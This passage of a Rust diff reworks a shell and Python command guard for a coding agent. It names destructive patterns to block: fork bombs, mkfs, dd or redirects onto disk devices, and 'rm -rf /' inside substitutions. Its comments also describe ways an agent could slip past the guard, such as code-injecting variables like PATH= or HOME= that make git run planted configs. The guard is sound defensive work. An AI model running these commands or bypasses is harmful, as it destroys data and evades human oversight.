-    let rest = &shell_outs.rest;
-    let rest_reaches_out = !python_is_statically_safe(rest)
-        || PY_RELOCATING_CALLS
+        let literals = shell_outs
+            .commands
             .iter()
-            .chain(&["environ", "putenv"])
-            .any(|s| rest.contains(s));
-    if rest_reaches_out && literals != Proof::Catastrophic {
+            .map(|cmd| shell_literal_proof(cmd, disk, depth + 1))
+            .max()
+            .unwrap_or(Proof::Safe);
+        if literals != Proof::Safe {
+            return literals;
+        }
+        let rest = &shell_outs.rest;
+        if python_side_effect_signal(rest)
+            || PY_RELOCATING_CALLS
+                .iter()
+                .chain(&["environ", "putenv"])
+                .any(|s| rest.contains(s))
+        {
+            return Proof::Unproven;
+        }
+        proven_shell_outs = !shell_outs.commands.is_empty();
+    } else if python_side_effect_signal(code) {
         return Proof::Unproven;
     }
-    literals
+    if python_imports_are_proven(code, proven_shell_outs) {
+        Proof::Safe
+    } else {
+        Proof::UnlistedImport
+    }
 }
 
 /// What one shell literal a Python call runs proves to be.
@@ -3032,51 +3674,76 @@ fn word_leads_out(
     if text.starts_with('-') || text.contains("://") || is_harmless_redirect(text) {
         return false;
     }
-    (word.expands && text.contains('/')) || path_literal_leads_out(text, root, disk, home)
+    if word.expands {
+        return after_home_variable(text).is_some_and(|rest| {
+            home_path_location(rest, root, disk, home) == PathLocation::Outside
+        });
+    }
+    path_literal_leads_out(text, root, disk, home)
 }
 
 /// True when the path literal `text` lands outside the workspace. A leading
 /// `~` or `~/` has two readings: `home`, as `expanduser` and an unquoted shell
 /// word read it, and a plain name, as a quoted word or a bare Python literal
-/// does. Both must stay inside. A `~user` form, or a `~` with no absolute
-/// home, cannot be shown inside.
+/// does. Either reading landing outside is evidence. A `~user` form, or a `~`
+/// with no absolute home, is doubt.
 fn path_literal_leads_out(
     text: &str,
     root: Option<&Path>,
     disk: Option<OnDisk<'_>>,
     home: Option<&Path>,
 ) -> bool {
-    if text.is_empty() {
-        return false;
-    }
-    if text.split('/').any(|seg| seg == "..") {
-        return true;
-    }
+    literal_path_location(text, root, disk, home) == PathLocation::Outside
+}
+
+/// A tilde literal may be expanded by the shell or Python's expanduser, or
+/// read as a literal name. Evidence and doubt remain distinct in both readings.
+fn literal_path_location(
+    text: &str,
+    root: Option<&Path>,
+    disk: Option<OnDisk<'_>>,
+    home: Option<&Path>,
+) -> PathLocation {
     let Some(rest) = text.strip_prefix('~') else {
-        return resolved_path_leads_out(Path::new(text), root, disk);
+        return literal_location(text, root, disk);
     };
-    if !(rest.is_empty() || rest.starts_with('/')) {
-        return true;
-    }
-    match home.filter(|h| h.is_absolute()) {
-        Some(home) => {
-            resolved_path_leads_out(&home.join(rest.trim_start_matches('/')), root, disk)
-                || resolved_path_leads_out(Path::new(text), root, disk)
-        }
-        None => true,
+    let expanded = home_path_location(rest, root, disk, home);
+    let literal = literal_location(text, root, disk);
+    match (expanded, literal) {
+        (PathLocation::Outside, _) | (_, PathLocation::Outside) => PathLocation::Outside,
+        (PathLocation::Workspace, PathLocation::Workspace) => PathLocation::Workspace,
+        _ => PathLocation::Unresolved,
     }
 }
 
-/// True when `path`, with no `~` or `..` left in it, lands outside.
-fn resolved_path_leads_out(path: &Path, root: Option<&Path>, disk: Option<OnDisk<'_>>) -> bool {
-    match disk {
-        Some(d) if path.is_absolute() => !resolves_inside(path, d.root, false),
-        Some(d) => d
-            .cwds
-            .iter()
-            .any(|cwd| !resolves_inside(&cwd.join(path), d.root, false)),
-        None => path.is_absolute() && !absolute_under_root(path, root),
+/// Where `~<rest>` lands once `~` expands to `home`. A `~user` form, or a `~`
+/// with no absolute home, cannot be placed.
+fn home_path_location(
+    rest: &str,
+    root: Option<&Path>,
+    disk: Option<OnDisk<'_>>,
+    home: Option<&Path>,
+) -> PathLocation {
+    if !(rest.is_empty() || rest.starts_with('/')) {
+        return PathLocation::Unresolved;
     }
+    home.filter(|h| h.is_absolute())
+        .map_or(PathLocation::Unresolved, |home| {
+            literal_location(
+                &home.join(rest.trim_start_matches('/')).to_string_lossy(),
+                root,
+                disk,
+            )
+        })
+}
+
+/// What follows `$HOME` or `${HOME}` at the start of `text`: the one expansion
+/// the guard can place. `None` for any other variable, or a second expansion.
+fn after_home_variable(text: &str) -> Option<&str> {
+    let rest = text
+        .strip_prefix("${HOME}")
+        .or_else(|| text.strip_prefix("$HOME"))?;
+    ((rest.is_empty() || rest.starts_with('/')) && !rest.contains(['$', '`'])).then_some(rest)
 }
 
 /// True when `segment` names a path no write may settle Safe on: one outside
@@ -3152,28 +3819,161 @@ fn is_pathish(token: &str) -> bool {
     t.contains('/') && !t.contains("://")
 }
 
-/// True when a path stays inside the workspace (the agent's cwd). Only a bare
-/// or `./`-relative literal path stays in. An absolute or home-relative path
-/// escapes, and so does any `..` traversal. A `$VAR` or a backtick
-/// substitution escapes too, since either can resolve anywhere.
-///
-/// The lexical checks read the word as the shell does, see [`dequoted`].
-///
-/// On disk the path must also resolve inside from every directory the line can
-/// be in. A symlink makes a lexically contained path land anywhere.
-fn path_in_workspace(token: &str, disk: Option<OnDisk<'_>>) -> bool {
-    let t = dequoted(token);
-    if t.starts_with('/') || t.starts_with('~') || t.contains(['$', '`']) {
-        return false;
+/// Confirmed location, with uncertainty separate from outside evidence.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum PathLocation {
+    Workspace,
+    Scratch,
+    Outside,
+    Unresolved,
+}
+
+/// The location of a word the shell expands. One function places a path for
+/// every scope consumer. A failed lookup, an expansion or an ambiguous link
+/// is doubt, never evidence of an outside target.
+fn path_location(text: &str, root: Option<&Path>, disk: Option<OnDisk<'_>>) -> PathLocation {
+    use PathLocation::*;
+    if let Some(rest) = after_home_variable(text) {
+        return home_path_location(rest, root, disk, home_dir().as_deref());
     }
-    !t.split('/').any(|seg| seg == "..")
-        && disk.is_none_or(|d| {
-            plain_word(token).is_some_and(|word| {
-                d.cwds
-                    .iter()
-                    .all(|cwd| resolves_inside(&cwd.join(word), d.root, true))
-            })
-        })
+    if text.is_empty() || text.contains(['$', '`']) {
+        return Unresolved;
+    }
+    if let Some(rest) = text.strip_prefix('~') {
+        if !(rest.is_empty() || rest.starts_with('/')) {
+            return Unresolved;
+        }
+        return home_dir().map_or(Unresolved, |home| {
+            located(&home.join(rest.trim_start_matches('/')), root, disk, true)
+        });
+    }
+    located(Path::new(text), root, disk, true)
+}
+
+/// The location of a path nothing expands: a string literal in quoted code.
+/// A `$`, a `~` and a glob character are plain name characters here.
+fn literal_location(text: &str, root: Option<&Path>, disk: Option<OnDisk<'_>>) -> PathLocation {
+    if text.is_empty() {
+        return PathLocation::Workspace;
+    }
+    located(Path::new(text), root, disk, false)
+}
+
+/// Where `path` lands. With `globs`, a glob character expands as in a shell.
+fn located(
+    path: &Path,
+    root: Option<&Path>,
+    disk: Option<OnDisk<'_>>,
+    globs: bool,
+) -> PathLocation {
+    use PathLocation::*;
+    let text = path.to_string_lossy();
+    let locate = |path: &Path| {
+        if let Some(d) = disk {
+            if resolves_inside(path, d.root, globs) {
+                return Workspace;
+            }
+            let Some(existing) = deepest_existing(path) else {
+                return Unresolved;
+            };
+            let Ok(real) = existing.canonicalize() else {
+                return Unresolved;
+            };
+            if real.starts_with(d.root) {
+                return Unresolved;
+            }
+            if crate::runtime::temp_dirs::roots()
+                .iter()
+                .any(|r| real.starts_with(r))
+            {
+                return if private_scratch_target(&path.to_string_lossy(), false) {
+                    Scratch
+                } else {
+                    Unresolved
+                };
+            }
+            Outside
+        } else if path.is_absolute() {
+            if absolute_under_root(path, root) {
+                return Workspace;
+            }
+            if text.split('/').any(|s| s == "..") {
+                return Unresolved;
+            }
+            if private_scratch_target(&text, false) {
+                return Scratch;
+            }
+            if crate::runtime::temp_dirs::roots()
+                .iter()
+                .any(|r| path.starts_with(r))
+            {
+                return Unresolved;
+            }
+            Outside
+        } else if text.split('/').any(|s| s == "..") {
+            // Without a disk, a leading traversal leaves the starting root;
+            // an internal traversal is unresolved rather than invented evidence.
+            if text.starts_with("../") || text == ".." {
+                Outside
+            } else {
+                Unresolved
+            }
+        } else {
+            Workspace
+        }
+    };
+    if path.is_absolute() || disk.is_none() {
+        return locate(path);
+    }
+    // Every candidate directory must agree, whatever their order.
+    let mut location = None;
+    for cwd in disk.unwrap().cwds {
+        let next = locate(&cwd.join(path));
+        if next == Outside {
+            return Outside;
+        }
+        location = Some(match location {
+            Some(seen) if seen != next => Unresolved,
+            _ => next,
+        });
+    }
+    location.unwrap_or(Workspace)
+}
+
+/// True when the whitespace-split `token` stays in the workspace. On disk a
+/// word whose quoting hides its path ([`plain_word`]) cannot be shown inside.
+fn path_in_workspace(token: &str, disk: Option<OnDisk<'_>>) -> bool {
+    let word = match disk {
+        Some(_) => match plain_word(token) {
+            Some(word) => Cow::Borrowed(word),
+            None => return false,
+        },
+        None => Cow::Owned(dequoted(token)),
+    };
+    // An empty word names the directory the line is in.
+    word.is_empty() || path_location(&word, disk.map(|d| d.root), disk) == PathLocation::Workspace
+}
+
+/// The path a whitespace-split `token` names, read as the shell reads it.
+/// `None` when a quote or an escaped space runs on past the token, so the
+/// token holds only a part of the word.
+fn whole_word(token: &str) -> Option<String> {
+    let mut word = String::with_capacity(token.len());
+    let mut quote: Option<char> = None;
+    let mut chars = token.chars();
+    while let Some(c) = chars.next() {
+        match (quote, c) {
+            (None, '\'' | '"') => quote = Some(c),
+            (Some(q), _) if c == q => quote = None,
+            (None, '\\') => word.push(chars.next()?),
+            (Some('"'), '\\') => match chars.next()? {
+                next @ ('$' | '`' | '"' | '\\') => word.push(next),
+                next => word.extend(['\\', next]),
+            },
+            _ => word.push(c),
+        }
+    }
+    quote.is_none().then_some(word)
 }
 
 /// True when a write to the shell word `token` may settle Safe: it stays in
@@ -3648,29 +4448,16 @@ fn is_harmless_redirect(target: &str) -> bool {
     matches!(t, "/dev/null" | "/dev/stdout" | "/dev/stderr" | "/dev/tty")
 }
 
-/// Literal spellings of the system temp dir that open a [`is_scratch_target`]
-/// path. macOS's per-user dir has its own matcher, [`per_user_temp_rest`].
-const SCRATCH_PREFIXES: &[&str] = &["/tmp/", "/private/tmp/"];
-
 /// The one variable spelling of the temp dir a scratch target may open with.
 /// A bare `$TMPDIR` is absent: unset, as on most Linux hosts, it names `/`.
 const TMPDIR_SCRATCH_PREFIX: &str = "${TMPDIR:-/tmp}/";
 
 /// True when [`TMPDIR_SCRATCH_PREFIX`] names the temp dir for `command`.
 ///
-/// Two conditions. The engine's own `TMPDIR`, which a coding agent inherits,
-/// is unset, empty or itself a temp dir. And `command` cannot rebind it
-/// ([`cannot_rebind_tmpdir`]).
+/// The inherited TMPDIR must be one of the shared scratch roots, and the
+/// command must not rebind it ([`cannot_rebind_tmpdir`]).
 fn tmpdir_trusted_for(command: &str) -> bool {
-    static INHERITED_IS_SCRATCH: LazyLock<bool> =
-        LazyLock::new(|| match std::env::var_os("TMPDIR") {
-            None => true,
-            Some(dir) => dir.to_str().is_some_and(|dir| {
-                dir.is_empty()
-                    || is_scratch_target(&format!("{}/x", dir.trim_end_matches('/')), false)
-            }),
-        });
-    *INHERITED_IS_SCRATCH && cannot_rebind_tmpdir(command)
+    crate::runtime::temp_dirs::inherited_tmpdir_is_scratch() && cannot_rebind_tmpdir(command)
 }
 
 /// Words that run code the line does not spell out, which may bind any name.
@@ -3724,11 +4511,13 @@ fn scratch_parts(target: &str, tmpdir_trusted: bool) -> Option<(PathBuf, String)
             )
         }
         _ => {
-            let rest = SCRATCH_PREFIXES
-                .iter()
-                .find_map(|prefix| path.strip_prefix(prefix))
-                .or_else(|| per_user_temp_rest(&path))?;
-            (PathBuf::from(&path[..path.len() - rest.len()]), rest)
+            let path = Path::new(&path);
+            let (base, rest) = crate::runtime::temp_dirs::roots().iter().find_map(|base| {
+                let rest = path.strip_prefix(base).ok()?.to_str()?;
+                Some((base.clone(), rest))
+            })?;
+            return (!rest.is_empty() && rest.split('/').all(is_plain_path_segment))
+                .then(|| (base, rest.to_string()));
         }
     };
     (!rest.is_empty() && rest.split('/').all(is_plain_path_segment))
@@ -3807,18 +4596,6 @@ fn is_plain_path_segment(seg: &str) -> bool {
             .all(|c| c.is_ascii_alphanumeric() || "._-+,:=@%".contains(c))
 }
 
-/// The path below macOS's per-user temp dir, `/var/folders/<a>/<b>/T/`, with
-/// or without the `/private` the dir really lives under.
-fn per_user_temp_rest(path: &str) -> Option<&str> {
-    let tail = path.strip_prefix("/private").unwrap_or(path);
-    let mut parts = tail.strip_prefix("/var/folders/")?.splitn(4, '/');
-    let named = |seg: &str| !seg.is_empty() && is_plain_path_segment(seg);
-    let (a, b, t) = (parts.next()?, parts.next()?, parts.next()?);
-    (named(a) && named(b) && t == "T")
-        .then(|| parts.next())
-        .flatten()
-}
-
 /// Output-redirect matcher (`>`, `>>`, `2>`, `&>`, …) capturing the target
 /// path. fd-duplications (`2>&1`) yield no path (the `&` stops the capture).
 /// Quotes stay in the capture, so `> data/"x"/f` is one target, not `data/`.
@@ -3834,15 +4611,32 @@ fn redirect_targets(segment: &str) -> impl Iterator<Item = &str> {
         .filter_map(|c| c.get(1).map(|m| m.as_str()))
 }
 
-/// If `command` matches a catastrophic pattern, return a short human-readable
-/// reason (used both for the verdict and for the refusal message). `None` means
-/// not catastrophic.
+/// What the catastrophic floor found in a command. Each variant carries a
+/// short reason for the verdict and the refusal message.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub enum Catastrophe {
+    /// A parsed catastrophic operation. No lane runs it, and no grant lifts it.
+    Proven(&'static str),
+    /// Only the workspace floor's substring fallback matched (ADR 0728 as
+    /// amended). The owner may allow this one command. A lane that cannot
+    /// ask refuses it, and no grant, judge verdict or auto-allow covers it.
+    Unproven(&'static str),
+}
+
+impl Catastrophe {
+    pub fn reason(self) -> &'static str {
+        match self {
+            Self::Proven(reason) | Self::Unproven(reason) => reason,
+        }
+    }
+}
+
+/// The catastrophic pattern `command` matches, if any.
 ///
 /// Deliberately narrow: only universally-destructive patterns no legitimate task
 /// needs. Out-of-workspace deletion of a *specific* path (e.g. `rm -rf /etc`) is
-/// NOT caught here — it belongs to the ask/judge lane in a later phase, not the
-/// deterministic hard-block.
-fn catastrophic_reason(command: &str) -> Option<&'static str> {
+/// NOT caught here. It belongs to the ask/judge lane, not the hard-block.
+fn catastrophic_reason(command: &str) -> Option<Catastrophe> {
     catastrophic_reason_at(command, 0, None)
 }
 
@@ -3851,14 +4645,14 @@ fn catastrophic_reason(command: &str) -> Option<&'static str> {
 /// The one guard lane a coding agent's background task takes. The agent's own
 /// permission check already saw the full command line, so the ask and judge
 /// lanes would ask twice. The hard-block is the floor no grant can lift.
-pub(crate) fn catastrophic_reason_for_command(command: &str) -> Option<&'static str> {
+pub(crate) fn catastrophic_reason_for_command(command: &str) -> Option<Catastrophe> {
     catastrophic_reason(&unwrap_shell_command(command))
 }
 
-pub(crate) fn catastrophic_reason_for_command_at(
+pub fn catastrophic_reason_for_command_at(
     command: &str,
     cwd: Option<&Path>,
-) -> Option<&'static str> {
+) -> Option<Catastrophe> {
     match cwd {
         None => catastrophic_reason_for_command(command),
         Some(cwd) => catastrophic_reason_at(&unwrap_shell_command(command), 0, Some(cwd)),
@@ -3866,14 +4660,28 @@ pub(crate) fn catastrophic_reason_for_command_at(
 }
 
 /// [`catastrophic_reason`], carrying the substitution-recursion depth.
-fn catastrophic_reason_at(command: &str, depth: usize, cwd: Option<&Path>) -> Option<&'static str> {
+fn catastrophic_reason_at(command: &str, depth: usize, cwd: Option<&Path>) -> Option<Catastrophe> {
+    catastrophic_reason_with_language(command, depth, cwd, false)
+}
+
+fn catastrophic_reason_with_language(
+    command: &str,
+    depth: usize,
+    cwd: Option<&Path>,
+    is_python: bool,
+) -> Option<Catastrophe> {
     if is_fork_bomb(command) {
-        return Some("a fork bomb (a recursive self-spawning process that exhausts the machine)");
+        return Some(Catastrophe::Proven(
+            "a fork bomb (a recursive self-spawning process that exhausts the machine)",
+        ));
     }
-    if formats_or_overwrites_disk(command) {
-        return Some(
+    // The operation scan owns shell/Python execution context. Re-running it
+    // on fragments from the quote-blind legacy recursion would turn literal
+    // heredoc text back into executable disk operations.
+    if depth == 0 && workspace_floor::formats_or_overwrites_disk(command, is_python) {
+        return Some(Catastrophe::Proven(
             "a raw disk format or overwrite (mkfs, dd, or a redirect onto a block device)",
-        );
+        ));
     }
     for segment in command_segments(command) {
         // Unwrap a shell wrapper PER SEGMENT, not just at the head of the
@@ -3884,25 +4692,37 @@ fn catastrophic_reason_at(command: &str, depth: usize, cwd: Option<&Path>) -> Op
         // Unwrapping here can only ADD a catastrophic verdict.
         let inner = unwrap_shell_command(&segment);
         if let Some(reason) = catastrophic_rm_or_chmod(&inner) {
-            return Some(reason);
-        }
-        if let Some(reason) = workspace_floor::reason(&inner, cwd) {
-            return Some(reason);
+            return Some(Catastrophe::Proven(reason));
         }
     }
-    if let Some(reason) = workspace_floor::reason(command, cwd) {
-        return Some(reason);
+    // The workspace floor places quoted data, heredoc bodies and
+    // substitutions itself, in its operation and filesystem checks alike. A
+    // fragment from the quote-blind segment split loses that context.
+    let found = match (depth, is_python) {
+        (0, true) => workspace_floor::python_reason(command, cwd),
+        (0, false) => workspace_floor::reason(command, cwd),
+        _ => None,
+    };
+    if matches!(found, Some(Catastrophe::Proven(_))) {
+        return found;
     }
     // A substitution runs its body, and every scan above reads the OUTER head,
     // so `echo $(rm -rf /)` resolves to `echo`. Classify each body too.
     if depth < MAX_SUBSTITUTION_DEPTH {
         for body in substitution_bodies(command) {
-            if let Some(reason) = catastrophic_reason_at(body, depth + 1, cwd) {
-                return Some(reason);
+            if let proven @ Some(_) = catastrophic_reason_at(body, depth + 1, cwd) {
+                return proven;
             }
         }
     }
-    None
+    found
+}
+
+/// The catastrophic floor's verdict for a bash or python tool's text, read in
+/// the tool's own language.
+pub fn tool_catastrophe(tool_name: &str, text: &str, root: Option<&Path>) -> Option<Catastrophe> {
+    let is_python = matches!(tool_name, tn::RUN_PYTHON | tn::RUN_PYTHON_BACKGROUND);
+    catastrophic_reason_with_language(&unwrap_shell_command(text), 0, root, is_python)
 }
 
 /// Split a command line into individual command segments at shell control
@@ -3983,11 +4803,12 @@ fn is_fork_bomb(command: &str) -> bool {
     false
 }
 
-/// Detect formatting a filesystem or overwriting a raw block device:
+/// Conservative fallback for ambiguous executable syntax mentioning
+/// formatting a filesystem or overwriting a raw block device:
 /// `mkfs[.fs] /dev/<disk>`, `dd ... of=/dev/<disk>`, or `> /dev/<disk>`.
 /// Harmless device targets (`/dev/null`, `/dev/stdout`, …) are excluded via
 /// [`is_disk_device`].
-fn formats_or_overwrites_disk(command: &str) -> bool {
+fn disk_operation_text(command: &str) -> bool {
     static MKFS: LazyLock<regex::Regex> =
         LazyLock::new(|| regex::Regex::new(r"\bmkfs(\.[A-Za-z0-9]+)?\b").unwrap());
     static OF: LazyLock<regex::Regex> = LazyLock::new(|| regex::Regex::new(r"\bof=(\S+)").unwrap());
@@ -4119,21 +4940,37 @@ fn next_non_flag_from(toks: &[&str], from: usize) -> usize {
 /// already falls through to the judge, so resolving these forms would newly
 /// SETTLE decorated commands as Safe.
 fn danger_head_candidates<'a>(toks: &'a [&'a str]) -> Vec<(String, &'a [&'a str])> {
+    head_candidates(toks, false)
+}
+
+/// [`danger_head_candidates`] without the reading in which a `command -v` or
+/// `command -V` lookup runs its operands. That form prints how each name
+/// resolves and runs nothing. Only the workspace floor drops it: the danger
+/// scans may only add a verdict, and a function named `command` can run them.
+/// The floor stays sound because it refuses a suspicious line that opens a
+/// function body (`(`, `{` or `function`).
+pub(crate) fn executed_head_candidates<'a>(toks: &'a [&'a str]) -> Vec<(String, &'a [&'a str])> {
+    head_candidates(toks, true)
+}
+
+fn head_candidates<'a>(toks: &'a [&'a str], skip_lookups: bool) -> Vec<(String, &'a [&'a str])> {
     // The grouping-token walk, from an arbitrary starting offset. A shell
     // keyword that opens a compound command is walked past too: the command
     // after `do` or `then` runs exactly as a bare one would. So is `eval`, but
     // only here: on `EXEC_WRAPPER_HEADS` the `-c` unwrap would also walk past
-    // it and discard a tail that `eval` parses again.
-    fn resolve_head_at(toks: &[&str], from: usize) -> usize {
+    // it and discard a tail that `eval` parses again. Also returns the prefix
+    // word right before the head, as [`command_head_walk`] does.
+    fn resolve_head_at<'a>(toks: &[&'a str], from: usize) -> (usize, Option<&'a str>) {
         const COMPOUND_OPENERS: &[&str] = &[
             "{", "(", "!", "if", "then", "else", "elif", "do", "while", "until", "eval",
         ];
         let mut from = from;
         loop {
-            let next = from + command_head_index(&toks[from..]);
+            let (offset, prefix) = command_head_walk(&toks[from..]);
+            let next = from + offset;
             match toks.get(next) {
                 Some(tok) if COMPOUND_OPENERS.contains(tok) => from = next + 1,
-                _ => return next,
+                _ => return (next, prefix),
             }
         }
     }
@@ -4144,9 +4981,14 @@ fn danger_head_candidates<'a>(toks: &'a [&'a str]) -> Vec<(String, &'a [&'a str]
         if start > toks.len() {
             continue;
         }
-        let at = resolve_head_at(toks, start);
+        let (at, prefix) = resolve_head_at(toks, start);
         let Some(head) = toks.get(at) else { continue };
         if seen[at] {
+            continue;
+        }
+        // A lookup is one reading of these tokens, so it leaves `at` unseen:
+        // in `env -i -u command -v rm`, `-u` may take `command` as its value.
+        if skip_lookups && prefix == Some("command") && is_lookup_option_run(&toks[at..]) {
             continue;
         }
         seen[at] = true;
@@ -4168,81 +5010,13 @@ fn danger_head_candidates<'a>(toks: &'a [&'a str]) -> Vec<(String, &'a [&'a str]
     candidates
 }
 
-/// Environment-variable names that make the process the command starts run
-/// code the command head says nothing about. The variable either names code
-/// to load, or moves where a config naming code is read from. Matched case-sensitively, because the
-/// loader and these interpreters read exact upper-case names.
-///
-/// **An entry ending in `=` is an EXACT name; every other entry is a prefix.**
-/// The three-letter names begin many ordinary application variables, and
-/// matching those as prefixes drops routine commands out of the Safe fast path
-/// for nothing.
-///
-/// Not a completeness claim: it covers the loader hooks (`LD_*`, `DYLD_*`) and
-/// the startup-file hooks of the interpreters we ship or that any dev box has.
-/// A miss costs a judge call that did not happen, so add rather than debate.
-const CODE_INJECTING_ENV_NAMES: &[&str] = &[
-    "LD_",
-    "DYLD_",
-    "BASH_ENV",
-    "ENV=",
-    // The most direct one. The agent can write its own binary with an ordinary
-    // in-workspace write, itself Safe. A `PATH=` preamble then runs it with no
-    // card, no checkpoint and no judge call. Exact, so `PATHEXT=` and the
-    // various build variables keep the fast path.
-    "PATH=",
-    "SHELLOPTS",
-    "BASHOPTS",
-    "PS4",
-    "IFS=",
-    "PYTHONSTARTUP",
-    "PYTHONPATH",
-    "PERL5OPT",
-    "PERL5LIB",
-    "RUBYOPT",
-    "NODE_OPTIONS",
-    "GIT_SSH",
-    "GIT_EXTERNAL_DIFF",
-    "GIT_PAGER",
-    "GIT_EDITOR",
-    // Covers GIT_CONFIG_GLOBAL / _SYSTEM / _COUNT / _KEY_n / _VALUE_n. These are
-    // the environment equivalents of `git -c` and `--config-env`, which
-    // `git_subcommand_safety` already refuses by name as "an executable
-    // config", and they reach the same place: a config file naming
-    // `diff.external` makes a plain `git diff` run it. The same write-then-run
-    // path as `PATH=` applies, since writing `data/g` is itself Safe.
-    "GIT_CONFIG",
-    // These move where git, curl and wget look for their config, onto a file
-    // an in-workspace write can plant. `HOME=. git diff` reads `./.gitconfig`
-    // and runs its `diff.external`. `GIT_DIR=x` reads `x/config`.
-    "HOME=",
-    "XDG_CONFIG_HOME=",
-    "GIT_DIR=",
-    "GIT_COMMON_DIR=",
-    "CURL_HOME=",
-    "WGETRC=",
-    "SYSTEM_WGETRC=",
-    "GIT_EXEC_PATH=",
-    // The same move for read-only heads. ripgrep and ack read flags from a
-    // config file (`--pre`, `--pager`), less runs `LESSOPEN` per file, and
-    // `PAGER` is git's fallback for `GIT_PAGER`.
-    "RIPGREP_CONFIG_PATH=",
-    "LESSOPEN=",
-    "LESSCLOSE=",
-    "ACKRC=",
-    "ACK_OPTIONS=",
-    // A prefix: `ACK_PAGER_COLOR` names a pager command too.
-    "ACK_PAGER",
-    "PAGER=",
-    // gh's config dir holds its pager and browser commands.
-    "GH_CONFIG_DIR=",
-    "GH_PAGER=",
-    "GH_BROWSER=",
-    // A lesskey file sets `LESSOPEN` from its `#env` section. The prefix covers
-    // `LESSKEYIN`, `LESSKEY_CONTENT` and the `_SYSTEM` forms; `LESS` carries `-k`.
-    "LESSKEY",
-    "LESS=",
-];
+/// True when the option run that opens `toks` holds `-v` or `-V`, which turns
+/// a `command` prefix into a lookup. Any other option, like `-p`, still runs.
+fn is_lookup_option_run(toks: &[&str]) -> bool {
+    toks.iter()
+        .take_while(|tok| is_flag_token(tok) && **tok != "--")
+        .any(|tok| !tok.starts_with("--") && tok.contains(['v', 'V']))
+}
 
 /// True when less's `args` load a lesskey file, whose `#env` section can set
 /// `LESSOPEN`: `-k FILE`, `-kFILE`, a short cluster holding `k`, or a
@@ -4256,7 +5030,7 @@ fn less_args_load_lesskey(args: &[&str]) -> bool {
 }
 
 /// True when `tok` is a `VAR=value` assignment whose variable name is one of
-/// [`CODE_INJECTING_ENV_NAMES`].
+/// `CODE_INJECTING_ENV_NAMES`.
 ///
 /// A trailing `=` in the list marks an **exact** variable name; every other
 /// entry is a name prefix. The distinction is load-bearing. `ENV` and `IFS`
@@ -4271,25 +5045,6 @@ fn is_code_injecting_assignment(tok: &str) -> bool {
     // before an exact-name comparison. Without it, an appended `PATH` sails
     // past the fast path while the plain one is refused.
     is_code_injecting_env_name(name.strip_suffix('+').unwrap_or(name))
-}
-
-/// True when the variable `name` is one of [`CODE_INJECTING_ENV_NAMES`], or
-/// one of [`LUCIDOS_CLI_ENV_NAMES`], matched exactly.
-///
-/// Also the agent-side refusal for a STORED variable
-/// (`environment_variables::validate_agent_name`). A stored one reaches every
-/// later subprocess with no preamble for this guard to see.
-pub(crate) fn is_code_injecting_env_name(name: &str) -> bool {
-    if name.is_empty() || name.starts_with('-') {
-        return false;
-    }
-    LUCIDOS_CLI_ENV_NAMES.contains(&name)
-        || CODE_INJECTING_ENV_NAMES
-            .iter()
-            .any(|p| match p.strip_suffix('=') {
-                Some(exact) => name == exact,
-                None => name.starts_with(p),
-            })
 }
 
 /// True when the `VAR=value` preamble before the head at `head_at` carries a
@@ -4473,19 +5228,31 @@ static EXEC_WRAPPER_HEADS_WITH_OPERAND: &[&str] = &[
 ///     which must not be mistaken for the command itself. Otherwise it slips
 ///     past both the safe-list and the catastrophic deny-list.
 fn command_head_index(toks: &[&str]) -> usize {
+    command_head_walk(toks).0
+}
+
+/// [`command_head_index`], plus the benign prefix word the walk stepped over
+/// last, when nothing else came between it and the head. `None` when an
+/// assignment or a redirect came last, so that word is no prefix: in
+/// `env A=x\ command -v rm`, `command` is part of a value.
+fn command_head_walk<'a>(toks: &[&'a str]) -> (usize, Option<&'a str>) {
     let mut i = 0;
-    while let Some(tok) = toks.get(i) {
+    let mut prefix = None;
+    while let Some(&tok) = toks.get(i) {
         if is_assignment_word(tok) {
             i += assignment_token_span(&toks[i..]);
+            prefix = None;
         } else if is_benign_prefix(tok) {
             i += 1;
+            prefix = Some(tok);
         } else if let Some(needs_target) = redirect_token_needs_target(tok) {
             i += if needs_target { 2 } else { 1 };
+            prefix = None;
         } else {
             break;
         }
     }
-    i
+    (i, prefix)
 }
 
 /// If `tok` is an I/O-redirection operator, return whether its target is the
@@ -4529,6 +5296,8 @@ struct BlankedHeredocs {
     text: String,
     /// A blanked body may run as code the proof did not read.
     unproven: bool,
+    /// A body ran to the end of input with no terminator line.
+    unterminated: bool,
 }
 
 /// `command` without the body and terminator line of each heredoc whose
@@ -4539,7 +5308,9 @@ struct BlankedHeredocs {
 /// `proven` accepts that body, the opener line, body and terminator read as
 /// `true`. Every other blanked body is unproven.
 ///
-/// For the fast path only. The danger scans read the whole command, since the
+/// The fast path and the secret scan ([`secret_scan_text`]) read its output.
+/// A body placed differently from the shell is therefore a guard bypass, not
+/// a fast-path miss. The other danger scans read the whole command, since the
 /// head may run the body as code. An opener inside quotes or a comment is text.
 /// An unquoted body expands, so it stays, and the walk skips it unread.
 ///
@@ -4555,6 +5326,7 @@ fn blank_literal_heredoc_bodies(
     let mut out = String::with_capacity(command.len());
     let mut copied = 0;
     let mut unproven = false;
+    let mut unterminated = false;
     let mut pending: Vec<Heredoc> = Vec::new();
     let mut quotes = QuoteState::default();
     let mut i = 0;
@@ -4587,6 +5359,7 @@ fn blank_literal_heredoc_bodies(
                 let mut at = i + 1;
                 for heredoc in pending.drain(..) {
                     let (body_end, end) = heredoc_body_end(command, at, &heredoc)?;
+                    unterminated |= body_end == command.len();
                     if heredoc.literal {
                         if runs_python && proven(&command[at..body_end]) {
                             out.push_str(&command[copied..line_start]);
@@ -4607,6 +5380,7 @@ fn blank_literal_heredoc_bodies(
     (copied > 0).then(|| BlankedHeredocs {
         text: out + &command[copied..],
         unproven,
+        unterminated,
     })
 }
 
@@ -4759,7 +5533,8 @@ fn heredoc_opener(command: &str, at: usize) -> Option<(Heredoc, usize)> {
             end = next;
             continue;
         }
-        if b[end].is_ascii_whitespace() || b";|&<>()".contains(&b[end]) {
+        // Only the shell's own blanks end the word: a `\r` is part of it.
+        if b" \t\n;|&<>()".contains(&b[end]) {
             break;
         }
         end += char_len_at(command, end);
@@ -5265,15 +6040,13 @@ fn is_mutating_http(args: &[&str]) -> bool {
                 .map_or((long, None), |(n, v)| (n, Some(v)));
             // wget, and older curl, accept an unambiguous prefix of a long
             // option, so `--post-f=x` is `--post-file=x`.
-            let abbreviates =
-                |flags: &[&str]| name.len() >= 2 && flags.iter().any(|f| f.starts_with(name));
-            if abbreviates(METHOD_FLAGS) {
+            if abbreviates_any(name, METHOD_FLAGS) {
